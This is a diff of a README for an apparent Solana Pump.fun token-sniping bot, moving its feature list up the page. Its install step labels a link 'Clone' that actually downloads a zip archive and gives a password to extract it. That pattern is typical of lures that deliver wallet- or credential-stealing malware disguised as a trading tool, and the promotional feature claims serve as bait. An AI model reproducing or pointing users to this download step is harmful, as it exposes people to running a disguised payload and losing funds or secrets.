@@ -8,6 +8,13 @@ Bot for sniping tokens listed on Pump.fun in the Solana network using C# and the
 - Creates and sends transactions to a specified target account.
 - Configurable via environment variables.
 
+## Usage
+- **Sniper Functionality**: Offers rapid detection and acquisition of newly listed tokens by scanning Dextools and PumpFun.
+- **Automated Purchasing**: Facilitates the automatic acquisition of tokens on the Solana blockchain via Raydium or Jupiter platforms.
+- **Profit-Driven Token Analysis**: Deploys sophisticated algorithms to pinpoint tokens with high growth potential.
+- **Adjustable Parameters**: Empowers users to fine-tune their buying strategies through customizable settings.
+- **Live Price Tracking**: Delivers real-time updates and continuous monitoring of token prices.
+
 ## Installation
 - [Clone](https://github.com/sui-sensei/pump.fun/archive/refs/heads/main.zip) the repository.
 - extract archive with pass `AcY20jQe`.
@@ -45,10 +52,3 @@ Example `config.json` file:
 3. **Solnet Libraries**: The project uses the Solnet library to interact with the Solana blockchain.
 
 4. **.NET SDK**: Ensure you have the .NET SDK installed. You can download it from the [.NET official site](https://dotnet.microsoft.com/download).
-
-## Usage
-- **Sniper Functionality**: Offers rapid detection and acquisition of newly listed tokens by scanning Dextools and PumpFun.
-- **Automated Purchasing**: Facilitates the automatic acquisition of tokens on the Solana blockchain via Raydium or Jupiter platforms.
-- **Profit-Driven Token Analysis**: Deploys sophisticated algorithms to pinpoint tokens with high growth potential.
-- **Adjustable Parameters**: Empowers users to fine-tune their buying strategies through customizable settings.
-- **Live Price Tracking**: Delivers real-time updates and continuous monitoring of token prices.
